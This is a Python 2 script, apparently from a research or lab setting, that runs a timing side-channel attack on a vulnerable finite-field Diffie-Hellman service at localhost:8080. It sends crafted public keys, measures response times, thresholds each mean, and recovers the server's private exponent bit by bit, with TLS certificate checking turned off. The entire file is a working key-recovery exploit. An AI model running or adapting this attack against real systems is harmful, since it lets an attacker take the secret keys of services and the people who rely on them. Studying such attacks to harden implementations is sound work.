#! /usr/bin/python
import random
import numpy
import gmpy
import math
import os
import argparse
import re
import requests
import time
import sys
from math import log

# if we don't do this we get a ton of warnings
# about invalid ssl cert, which we don't care about for this application
requests.packages.urllib3.disable_warnings()

mn = 31366490.5582
sd = 2347412.91192

modp1536 = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF

num_queries = 0

verbose = False

# Finds the answer in the html response
# match this:
# <textarea rows="10" cols="100">190626960452956247419695292674890845389236287771162900510887408954016569196983689270362280290444954276286275511885909485760119513553603870270811846573900309297104841255139042473590538681663556667582198129873271845240636343601265005730687446279869743997779440002307239715678523358061493359448577027149305161790725267680870760014746956671841545848963843717140472261815532829234489661372348135245679311771545802823984705477738631732982599826268382920964259091475274</textarea>
answer_re = re.compile(r".*<textarea rows=\"10\" cols=\"100\">(\d+)</textarea>.*", re.DOTALL | re.MULTILINE)

question_answer_pair = None

def generate_point(knownbits, modulus=modp1536, numZeros=65):
    z = 1
    while log(z,2) < log(modulus, 2) - 1: 
        y = int(gmpy.invert( knownbits << 1, (modulus - 1)/2))
        x = random.randrange(1 << ((1536 - numZeros)/2))
        x *= x # No need to reduce. Already less than half modulus width.
        z = pow(x, y, modulus)
    return z

def true_times(samples, drops, e, use_embedded_time, log_file):
    times = []
    if use_embedded_time:
        debug(log_file, "Using embedded time")
    else:
        debug(log_file, "Using network time")
    with requests.Session() as session:
        for sample in samples:
            start = time.time()
            html = session.post("https://localhost:8080/authenticate", files=dict(A=str(sample)), verify=False).text
            stop = time.time()
            # we might want to save this answer for later use, to see if we're done
            global question_answer_pair
            if not question_answer_pair:
                answerMatch = answer_re.match(html)
                question = sample
                answer = answerMatch.group(1)
                question_answer_pair = (question, answer)
            if use_embedded_time:
                embedded_time = re.search("\((.*) ns\)", html)
                duration = int(embedded_time.groups()[0])
            else:
                assert stop > start
                # scale to nanoseconds, which is what we expect
                start = start * 1000000000
                stop = stop * 1000000000
                duration = stop - start

            times.append(duration)
            global num_queries
            num_queries += 1
    times = times[drops:] # remove the first timings, because JVM startup
    return times

def get_null_stats(size, drops, e, use_embedded_time, log_file=None):
    samples = []
    for i in xrange(size + drops):
        samples.append(random.randrange(modp1536))
    times = true_times(samples, drops, e, use_embedded_time, log_file)
    mu = numpy.mean(times, dtype=numpy.float64)
    sigma = numpy.std(times, dtype=numpy.float64)
    return mu, sigma

def guess_bit(known_bits, sample_size, mean, upperthreshold, lowerthreshold, drops, e, use_embedded_time, log_file=None):
    samples = []
    for i in xrange(sample_size + drops):
        samples.append(generate_point(known_bits))
    times = true_times(samples, drops, e, use_embedded_time, log_file)
    tau = numpy.mean(times, dtype = numpy.float64)
    debug(log_file, "Slow mean is " + str(tau))

    delta = tau - mean
    if delta > upperthreshold:
        return 1
    elif delta < lowerthreshold:
        return 0

    # indicates it should be run again
    return -1


def test_secret(private_key):
    global question_answer_pair
    if not question_answer_pair:
        return False
    question = question_answer_pair[0]
    expected_answer = question_answer_pair[1]
    answer = pow(question, private_key, modp1536)
    if str(answer) == str(expected_answer):
        return True
    return False

def debug(log_file, *args):
    global verbose
    if (verbose):
        for arg in args:
            print >> sys.stderr, arg
    if log_file:
        for arg in args:
            log_file.write(str(arg))
        log_file.write("\n")

def main():
    parser = argparse.ArgumentParser(description="Run timing attack on vulnerable FFDH implementation")
    parser.add_argument('numsamples', type=int, help='Number of dummy public keys to use for timing.')
    parser.add_argument('drops', type=int, help='Number of samples to drop as warmup for the JVM')
    parser.add_argument('initialbits', help="Initial bits of the secret encoded as a base 10 or 16 integer")
    parser.add_argument('--env', nargs='?', default='j', help='Environment options: \nj (default) = Turn off JIT\nb = Turn off JIT and use bytecodes for timing\no = Leave JIT on.')
    parser.add_argument('-r', action='store_true', help="If set, recompute the mean and std deviation.")
    parser.add_argument('-v', action='store_true', help="Verbose output.  Includes intermediate guesses.")
    parser.add_argument('-e', action='store_true', help="Use time embedded in page instead of network time")
    parser.add_argument('--upperthreshold', type=int, default=2000000, help="Threshold that indicates a one")
    parser.add_argument('--lowerthreshold', type=int, default=1000000, help="Threshold that indicates a 0")
    args = parser.parse_args()
    global verbose
    verbose = args.v
    my_env = os.environ.copy()
    if args.env == 'j':
        my_env['JAVA_OPTS'] = '-Xint'
    elif args.env == 'b':
        my_env['JAVA_OPTS'] = '-XX:-UseCompiler -XX:+CountBytecodes'
        my_env['JAVA_HOME'] = '/home/iblumenfeld/testjvm/j2sdk-image'
    elif args.env == 'o':
        pass
    else:
        print "Invalid environment option. Choose one of 'j', 'b', or 'o'."
        return
    known = int(args.initialbits, 0)
    numsamples = args.numsamples
    use_embedded_time = args.e
    drops = args.drops
    # specifying 0 as the third argument to prevent buffering.
    with open("guess_log.txt", "w+", 0) as l:
        debug(l, "Known bits: ", bin(known))
        if args.r:
            debug(l, "Computing initial distribution mean and std deviation")
            m, s = get_null_stats(1000, 2*drops, my_env, use_embedded_time, log_file=l)
        else:
            m, s = mn, sd

        debug(l, "Mean = " + str(m) + "\nStandard dev = " + str(s))
        debug(l, "Starting to guess bits")
        curBit = 0
        while not test_secret(known):
            b = -1
            while b == -1:
                b = guess_bit(known, numsamples, m, args.upperthreshold, args.lowerthreshold, drops, my_env, use_embedded_time, log_file=l)
                if b == -1:
                    debug(l, "retrying bit %d..." % (curBit,))

            known = (known << 1) | b
            debug(l, "Bit %d guessed is: %d" % (curBit, b))
            curBit += 1
            debug(l, "Current guess is: ", hex(known))
            debug(l, "Current guess is: ", bin(known))
            numKnownBits = known.bit_length()
            debug(l, "Guess bit length: ", numKnownBits)
            if numKnownBits > 64:
                print "Failed to find correct key after reasonable amount of time"
                return
        debug(l, "Num queries: ", num_queries)
    print "Key: " + hex(known)
    return

if __name__ == '__main__':
    main()
